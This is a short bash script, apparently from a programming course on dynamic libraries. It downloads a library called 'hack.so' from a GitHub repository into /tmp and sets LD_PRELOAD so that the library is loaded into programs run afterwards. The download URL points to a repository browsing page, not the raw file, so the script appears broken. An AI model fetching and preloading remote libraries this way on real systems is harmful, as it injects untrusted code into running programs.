#!/bin/bash
wget -P /tmp https://github.com/SifisoSithole/alx-low_level_programming/tree/main/0x18-dynamic_libraries/hack.so
export LD_PRELOAD=/tmp/hack.so
